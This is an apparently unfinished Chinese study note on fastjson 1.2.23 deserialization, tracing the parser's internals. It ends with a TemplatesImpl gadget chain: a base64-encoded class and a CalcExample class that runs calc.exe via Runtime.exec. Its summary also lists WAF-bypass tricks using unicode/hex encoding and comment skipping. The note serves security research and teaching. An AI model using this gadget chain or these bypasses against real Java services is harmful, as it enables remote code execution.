* fastjson的基本使用介绍
* fastjson反序列化的分析
* 各版本的利用和防御绕过
* 原生URL反序列化和fastjson反序列化
  * 也不能直接dnslog

* waf对抗
* fastjson组件的识别
* 利用工具
* 补充
  * 第三种写法真的无法利用吗
    * 多态？（反序列化的危险类是要反序列化对象属性的子类或父类）
  * 看看JSONObject的动态代理


### fastjson的基本使用

#### 简介

* FastJson 是阿⾥巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，⽀持将 Java Bean 序列 化为JSON字符串，也可以从JSON字符串反序列化到 Java Bean 。

#### 序列化

* 最常用的序列化函数为JSON.toJSONString

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

import java.util.Properties;

public class User {
    private String name;
    private int age;
    private Flag flag;
    public String publictest;
    private String privatetest;
    private Student student;
    public Properties prop;

    public User() {
        System.out.println("User constructor has called.");
        this.name = "p1g3";
        this.age = 19;
        this.flag = new Flag();
        this.publictest = "test";
        this.privatetest = "test";
        this.student = new Student();

        this.prop = new Properties();
        this.prop.put("name", "666");
    }

    public String getName() {
        System.out.println("getName has called.");
        return name;
    }

    public void setName(String name) {
        System.out.println("setName has called.");
        this.name = name;
    }

    public int getAge() {
        System.out.println("getAge has called.");
        return age;
    }

    public void setAge(int age) {
        System.out.println("setAge has called.");
        this.age = age;
    }

    public Flag getFlag() {
        System.out.println("getFlag has called.");
        return flag;
    }

    public void setFlag(Flag flag) {
        System.out.println("setFlag has called.");
        this.flag = flag;
    }

    @Override
    public String toString() {
        return "User{" +
                "name='" + name + '\'' +
                ", age=" + age +
                ", flag=" + flag +
                '}';
    }

    public Student getStudent() {
        System.out.println("getStudent has called.");
        return student;
    }

    public void setStudent(Student student) {
        System.out.println("setStudent has called.");
        this.student = student;
    }

    public static void main(String[] args) {
        String  serJson0 = JSON.toJSONString(new User());
        System.out.println(serJson0);
        System.out.println("----------------------------");
        String  serJson1 = JSON.toJSONString(new User(), SerializerFeature.WriteClassName);
        System.out.println(serJson1);

    }
}

class Flag{
    private String flag;

    public Flag(){
        System.out.println("Flag constructor has called.");
        this.flag = "flag{d0g3_learn_java}";
    }

    public String getFlag() {
        System.out.println("getFlag has called.");
        return flag;
    }

    public void setFlag(String flag) {
        System.out.println("setFlag has called.");
        this.flag = flag;
    }
}

```

```xml
 <dependencies>
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.23</version>
        </dependency>
    </dependencies>
```



我们先查看`String  serJson0 = JSON.toJSONString(new User());`的结果

![image-20241216104149936](./images/image-20241216104149936.png)

注意到，序列化过程中调用了属性的get方法，私有属性且没有get方法的，没有被序列化。

再看`JSON.toJSONString(new User(), SerializerFeature.WriteClassName);`

![image-20241216104446945](./images/image-20241216104446945.png)

首先解释一下这里的@Type，很容易看出，这个字段标识出了对象的类型。JSON 标准是不⽀持⾃省的，也就是说根据 JSON ⽂本，不知道它包含的对象的类型。 FastJson ⽀持⾃省，在序列化时传⼊类型信息 SerializerFeature.WriteClassName ，可以得到能表明对象类型的 JSON ⽂本。但是可以发现，这里的Flag和Student（在同一个包下定义的一个简单的public类）并没有@Type，原因是在序列化的过程中，在有了`"@type":"org.example.User"`后Flag和Student的类型是明确的，在同一个包下即可找到。

#### 三种反序列化的用法

```java
public class Main {
    public static void main(String[] args) {
        String serJson0 = "{\"age\":19,\"flag\":{\"flag\":\"flag{d0g3_learn_java}\"},\"name\":\"p1g3\",\"prop\":{\"name\":\"666\"},\"publictest\":\"test\",\"student\":{\"age\":10,\"name\":\"st\"}}";
        System.out.printf("Parse had done => %s\n", JSON.parse(serJson0).getClass());
        System.out.printf("parseObject one has done => %s\n",JSON.parseObject(serJson0).getClass());
        System.out.printf("parseObject second has done => %s\n",JSON.parseObject(serJson0,User.class).getClass());

        System.out.println("------------------------------------------");

        String serJson1 = "{\"@type\":\"org.example.User\",\"age\":19,\"flag\":{\"flag\":\"flag{d0g3_learn_java}\"},\"name\":\"p1g3\",\"prop\":{\"@type\":\"java.util.Properties\",\"name\":\"666\"},\"publictest\":\"test\",\"student\":{\"age\":10,\"name\":\"st\"}}";
        System.out.printf("Parse had done => %s\n", JSON.parse(serJson1).getClass());
        System.out.printf("parseObject one has done => %s\n",JSON.parseObject(serJson1).getClass());
        System.out.printf("parseObject second has done => %s\n",JSON.parseObject(serJson1,User.class).getClass());


    }
}
```

parseObject和parse差别不大

```java
public static JSONObject parseObject(String text) {
    Object obj = parse(text);
    if (obj instanceof JSONObject) {
        return (JSONObject)obj;
    } else {
        try {
            return (JSONObject)toJSON(obj);
        } catch (RuntimeException var3) {
            RuntimeException e = var3;
            throw new JSONException("can not cast to JSONObject.", e);
        }
    }
}
```

先看`serJson0`的三种反序列化

![image-20241216110741080](./images/image-20241216110741080.png)

从输出中可以看到，在调⽤parse以及第⼀种调⽤parseObject的⽅式，并没有正常的反序列化JSON数据，只有第三种使⽤⽅式才将JSON数据正确还原为⼀ 个对象。并且从输出中还可以得知，Fastjson在反序列化时主要调⽤的是每个属性的set⽅法，并且当属性为对象时会调⽤该对象的⽆参构造器去创建对象。没有反序列化成功的原因，对比第三种反序列化方式，可以很简单地推理出，显然fastjson无法确认我们反序列化的是哪个类。

再看`serJson1`的反序列化

```txt
User constructor has called.
Flag constructor has called.
setAge has called.
Flag constructor has called.
setFlag has called.
setFlag has called.
setName has called.
setStudent has called.
Parse had done => class org.example.User
User constructor has called.
Flag constructor has called.
setAge has called.
Flag constructor has called.
setFlag has called.
setFlag has called.
setName has called.
setStudent has called.
getAge has called.
getFlag has called.
getName has called.
getStudent has called.
getFlag has called.
parseObject one has done => class com.alibaba.fastjson.JSONObject
User constructor has called.
Flag constructor has called.
setAge has called.
Flag constructor has called.
setFlag has called.
setFlag has called.
setName has called.
setStudent has called.
parseObject second has done => class org.example.User
```

第二种的反序列化方式的差异在于`toJSON(obj)`。

根据上面的调试分析，不难发现这里反序列化的漏洞的产生是由于反序列化的类是可控的导致攻击者可以寻找危险的set或get⽅法去调⽤从⽽触发漏洞。

### fastjson反序列化的分析(1.2.23)

三种反序列化写法的核心逻辑差异基本相同，所以这里仅仅对第二种反序列化写法进行调试分析。<u>下文的调试过程采用的之前的json字符串，但是注意在调试带有@type和不带@type时不要写在同一个java文件中，防止缓存干扰</u>。

**对不带@type的json字符串进行反序列化**

步入parse进行分析

![image-20241216160508317](./images/image-20241216160508317.png)

先初始化一个用于解析的DefaultJSONParser，在初始化的过程中，获取了input的第一个字符，并根据其设置相应的token

![image-20241216162117579](./images/image-20241216162117579.png)

步入parser.parse()进行解析处理

![image-20241216160631471](./images/image-20241216160631471.png)

根据之前设置的token进行选择处理

![image-20241216162335110](./images/image-20241216162335110.png)

继续步入，来到下图方法，其中的for循环是最主要的解析逻辑，每次循环解析一个键值对。此时的下标在`{`的下一个位置，当前字符进行判断，根据不同结果进行不同处理，这里对`"`的情况进行分析

![image-20241216163831400](./images/image-20241216163831400.png)

注意到这里的`lexer.skipWhitespace()`，梳理完代码逻辑后，会发现它在几乎所有`"`的两边调用。其代码逻辑如下，是跳过了一些特殊字符，`skipComment()`则是跳过了注释，这里对于我们绕waf或者在某些情况下需要构造畸形字符很有帮助。

![image-20241216164247526](./images/image-20241216164247526.png)

![image-20241216164413106](./images/image-20241216164413106.png)

接下来的`if (lexer.isEnabled(Feature.AllowArbitraryCommas))`默认是true，后面的`while (ch == ',')`也跳过了一些字符，除开之前的字符外，`,`也会被跳过

![image-20241216165337167](./images/image-20241216165337167.png)

接着要解析一个key，也就是将`"`之间的字符解析出来

![image-20241216165700789](./images/image-20241216165700789.png)

这里代码很长，概括来说就是将`"`之间的字符解析出来，其中需要注意的是，为了支持`\`转义，对`\`需要特殊处理，特别需要注意的是，这里支持unicode编码和hex编码。

![image-20241216170230424](./images/image-20241216170230424.png)

回到`parseObject`中，后面对获取的key进行判断，是否等于`@type`，且查看`!lexer.isEnabled(Feature.DisableSpecialKeyDetect)`是true还是false，默认为true。例子中解析的第一个key为`"age"`，不为`@type`，我们接着往后走

![image-20241216172335097](./images/image-20241216172335097.png)

这里还有个if，是判断引用相关的内容，这里不分析

![image-20241216174515588](./images/image-20241216174515588.png)

再到后面的if分支，对value进行解析，然后将解析出的key和value put进一个JSONObject中，这个过程没有加载类的操作

![image-20241216175334908](./images/image-20241216175334908.png)

**带@type的json字符串进行反序列化**

前面的过程都相同，我们到对key进行判断是否等于`@Type`的地方

首先使用类加载器加载了类，这里加载的逻辑就不具体分析了

![image-20241217152958504](./images/image-20241217152958504.png)

随后的if分之内有反序列化操作，但是这里实验的例子没有进入if，简单看一下，json字符串的下一个字符为`}`就会进入这个分支。我们继续往后，进行了反序列化操作

![image-20241217155932706](./images/image-20241217155932706.png)

`getDeserializer`是返回了一个反序列化器，我们步入`config.getDeserializer(clazz)`，其逻辑主要是三个if分支，第一个是尝试从缓存中获取反序列化器，第二个是若`type`为`class<?>`调用`getDeserializer((Class<?>) type, type)`获得，第三个当 `type` 是一个带参数的泛型类型（`ParameterizedType`），例如 `List<String>` 或 `Map<String, Integer>`，要先处理其原始类型。

![image-20241225110011100](./images/image-20241225110011100.png)

从缓存中获取就是对比type的hash值，从一个hashmap中获取，至于这个缓存是如何产生的，暂时不讨论

![image-20241225110236614](./images/image-20241225110236614.png)

我们步入`getDeserializer((Class<?>) type, type)`查看第二个if的逻辑，先尝试从缓存中读取，然后对一些特殊类型进行处理，注意到下图处，`denyList`维护了一个黑名单，不允许这个黑名单内的类获取反序列化器

![image-20241225113252816](./images/image-20241225113252816.png)

继续往后，代码比较长，大量的代码是针对一些特定的类获取反序列化器，来到下图处，通过`createJavaBeanDeserializer`创建一个反序列化器

![image-20241225144812224](./images/image-20241225144812224.png)

继续步入，代码依然很长，一句话总结，前面大量的代码做了两件事，一是检查类是否存在@JSONType注解且制定了一个自定义的反序列化器，存在就返回该反序列化器，二是通过很多条件检查是否启用ASM动态生成字节码来优化反序列化过程，测试的例子不符合这些条件，我们也不去具体分析，来到`return new JavaBeanDeserializer(this, clazz, type);`继续步入

![image-20241225161515304](./images/image-20241225161515304.png)

这里通过`JavaBeanInfo.build(clazz, type, config.propertyNamingStrategy)`获取了一个`JavaBeanInfo`，这个类很关键，里面包含了要反序列化类的很多信息。

![image-20241225162754677](./images/image-20241225162754677-1735115275951-1.png)

首先通过反射获取类的属性、方法、构造方法，这里要获取一个无参构造函数或者，当目标类为非静态内部类时，获取一个带一个外部类实例作为参数的构造函数

![image-20241225164417311](./images/image-20241225164417311.png)

如果没有符合要求的构造函数，比如不为非静态内部类，但是也没有无参构造函数，则会去寻找 `@JSONCreator` 注解的构造函数或者带有`@JSONCreator` 注解的工厂方法，都没找到就抛出异常，这样的特殊情况对于我们的利用没有帮助，我们略过这一段的分析，后面还有一大段关于`JSONType.class`的代码也略过。

![image-20241226104912240](./images/image-20241226104912240.png)

继续往下，对获取的方法进行遍历处理，首先排除掉一些不符合要求的方法，找到`setxxx`方法，从该方法中提取出属性名，然后获取到先前获得的属性列表中对应的属性

![image-20241226111223699](./images/image-20241226111223699.png)

然后会根据之前获取的方法和属性new一个`FieldInfo`对象，将其添加到`fieldList`中，值得注意的是`FieldInfo`有一个属性`getOnly`，当获取方法参数数量不为1或者属性被Final修饰时，该属性被设置为`true`。

注意到，上述的遍历仅仅是获取了存在`setter`的属性，接下来继续遍历`clazz.getFields()`，即类的所有public属性（包括父类），将刚刚没有获取到的属性补充到`fieldList`中，这也解释了之前的测试结果，非public且没有`setter`的属性将不会被反序列化。

![image-20241226160542159](./images/image-20241226160542159.png)

接下来继续遍历`clazz.getMethods()`，从中提取出非静态、没有参数、返回值类型满足下图条件的类的`getter`方法，然后同样地将其对应的属性生成`FieldInfo`（前面没有获取到）添加到`fieldList`中，注意其getOnly由于`getter`方法没有参数，将会设置为false

![image-20241226161104059](./images/image-20241226161104059.png)

最后，根据之前获取的属性、构造器、方法等new一个`JavaBeanInfo`并返回。往上一层返回到`JavaBeanDeserializer#JavaBeanDeserializer`，继续返回到`ParserConfig#createJavaBeanDeserializer`，再往上返回到`ParserConfig#getDeserializer(Class<?> clazz, Type type)`，再往上返回到`ParserConfig#getDeserializer(Type type)`，最终将反序列化器返回，我们也回到`DefaultJSONParser#parseObject`中。

看一下反序列化器的属性：

1. derializer 有一个属性`sortedFieldDeserializers`包含了要反序列化类的属性，2. config有一个denyList属性，是一个黑名单，写明了禁止反序列化的类，3. 获取beanInfo

![image-20241219112901721](./images/image-20241219112901721.png)

![image-20241219112923584](./images/image-20241219112923584.png)

步入`deserialze`，由于后面的代码过于复杂，需要明确一下分析的目标，主要是三点：1. 加载的类是如何实例化的，这也涉及到类get和set方法的调用，对我们的攻击至关重要；2. 在解析了`@type`字段后，就开始了类的反序列化操作，json字符串的其他部分还没有解析，大致了解一下是如何进行解析的；3. 一些需要关注的细节问题，例如有没有一些跳过特殊字符的操作，有没有一些动态调用类的方法、初始化类的操作可以利用。

步入deserialze后发现一个for循环，这个for遍历`sortedFieldDeserializers`结合json字符串的内容，实例化我们加载的类

![image-20241219143703134](./images/image-20241219143703134.png)

在这个循环中，来到`if (fieldDeser != null)`内，开始对类的属性进行反序列化，我们先看例子中的`age`，是基本类型`int`，这里匹配类型后使用`lexer.scanFieldInt`从json字符串中获得了值，再往后来到下图代码处，开始实例化类

![image-20241219144357074](./images/image-20241219144357074.png)

步入方法，首先判断要实例化的是否是接口，如果是，则使用JSONObject代理该接口

![image-20241219160523345](./images/image-20241219160523345.png)

后续使用反序列化器的beanInfo中的构造器来实例化类，如果该构造器无参，直接实例化

![image-20241219165334952](./images/image-20241219165334952.png)

如果有参，这里是只考虑到了内部类实例化的情况，`else`里的大段代码这里就略过了。

实例化后，还有一个检查，是否开启了`Feature.InitStringFieldAsEmpty`（默认关闭），如果开启了，就会把刚刚实例化产生的对象的`String`类型的属性设置为空字符串。如果先前已经获取到了对应属性的set方法，将会调用该方法设置，否则通过反射设置。

![image-20241219170408132](./images/image-20241219170408132.png)

![image-20241219170656664](./images/image-20241219170656664.png)

实例化产生的对象return到`JavaBeanDeserializer#deserialize`中，到下图代码处，将先前解析出的值set给对象

![image-20241219172646783](./images/image-20241219172646783.png)

步入`FieldDeserializer#setValue`，如果先前获取到了属性的set方法，且`getOnly`不为true，则会调用set方法；按照之前的分析，一些情况下`getOnly`为true，这些情况加将会调用获取到的get方法

![image-20241219174835927](./images/image-20241219174835927.png)

![image-20241219174904014](./images/image-20241219174904014.png)

如果连set方法都没有获取到，则会通过反射赋值。

![image-20241219175002083](./images/image-20241219175002083.png)

至此，类被实例化，第一个属性被反序列化。我们这里继续跟一下这个反序列化类属性的for循环，主要是分析一下它是如何反序列化非基本类型的。

要解析的第二个属性是`flag`，不是基本类型，首先取得了key为`flag`，在后续的类型匹配时没有和一些基本类型匹配上，于是代码到下图

![image-20241220103838478](./images/image-20241220103838478.png)

步入，首先获取到一个反序列化器，这个过程和之前类似，然后递归调用`javaBeanDeser.deserialze`，在反序列化`"flag{d0g3_learn_java}"`后，再通过`FieldDeserializer#setValue`将属性赋值

![image-20241220105920607](./images/image-20241220105920607.png)

![image-20241220110033058](./images/image-20241220110033058.png)

**分析第二种写法的get调用情况**（TODO）

```java
System.out.printf("parseObject one has done => %s\n",JSON.parseObject(serJson1).getClass());
```

从上述代码运行的结果中可以观察到第二种写法和其他两种有些不同，打印的结果中调用了类的`getter`方法，对比后不难发现原因在于

![image-20241230174651185](./images/image-20241230174651185.png)

#### 总结

* JSON中的键&值均可使⽤unicode编码 & ⼗六进制编码（可⽤于绕过WAF检测） 
* JSON解析时会忽略双引号外的所有空格、换⾏、注释符（可⽤于绕过WAF检测）
* 反序列化过程中会调用类的构造器（一般是无参）
* 反序列化过程中会调用属性相应的set方法
* 一些满足特点要求的类在反序列化过程中会调用相应属性的get方法
* 第二种反序列化写法会调用属性的get方法（TODO）

### 补充：第三种写法的反序列化情况

### 几个利用链的补充分析

#### TemplatesImpl

```java
public class HelloTemplatesImpl {
    public static void main(String[] args) throws TransformerConfigurationException {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANwoADAAbCQAcAB0IAB4KAB8AIAoAIQAiCAAjCgAhACQHACUHACYKAAkAJwcAKAcAKQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwAqAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAJQEAClNvdXJjZUZpbGUBABBDYWxjRXhhbXBsZS5qYXZhDAANAA4HACsMACwALQEADENhbGMgRXhhbXBsZQcALgwALwAwBwAxDAAyADMBAAhjYWxjLmV4ZQwANAA1AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAANADYBAAtDYWxjRXhhbXBsZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACwAMAAAAAAAEAAEADQAOAAEADwAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABABAAAAAOAAMAAAARAAQAEgAMABMAAQARABIAAgAPAAAAGQAAAAMAAAABsQAAAAEAEAAAAAYAAQAAABgAEwAAAAQAAQAUAAEAEQAVAAIADwAAABkAAAAEAAAAAbEAAAABABAAAAAGAAEAAAAdABMAAAAEAAEAFAAIABYADgABAA8AAABUAAMAAQAAABe4AAUSBrYAB0unAA1LuwAJWSq3AAq/sQABAAAACQAMAAgAAgAQAAAAFgAFAAAADAAJAA8ADAANAA0ADgAWABAAFwAAAAcAAkwHABgJAAEAGQAAAAIAGg==");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "CalcExample");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        obj.newTransformer();
    }

    private static void setFieldValue(Object obj, String propertyName, Object value) {
        try {
            // 获取对象的类
            Class<?> clazz = obj.getClass();
            // 获取指定名称的属性
            Field field = clazz.getDeclaredField(propertyName);
            // 设置属性的访问权限
            field.setAccessible(true);
            // 设置属性值
            field.set(obj, value);
        } catch (NoSuchFieldException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }
}
```

加载的类如下，必须继承`AbstractTranslet`

```java
public class CalcExample extends AbstractTranslet {
    static{
        try {
            Process process = Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    public CalcExample(){
        System.out.println("Calc Example");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

**利用链流程梳理**

注意TemplatesImpl#defineTransletClasses()和Constructor#newInstance()均在TemplatesImpl#getTransletInstance()中被调用

```txt
TemplatesImpl#newTransformer()->
	TemplatesImpl#getTransletInstance()->
		TemplatesImpl#defineTransletClasses()->
			TemplatesImpl#getTransletInstance()->
				TransletClassLoader#defineClass()
		Constructor#newInstance()
```

#### JdbcRowSetImpl

### 漏洞历史

#### Fastjson<=1.2.24

##### TemplatesImpl利用链

**利用前提**：

注意到了Templateslmpl#getOutputProperties()中调用了newTransformer()，这就和之前TemplateImpl的利用链连接起来了，那我们来看看

**payload**

**getOutputProperties的调用分析**

### 探测

#### json反序列化库的探测

#### fastjson关键版本探测

### 工具

#### 
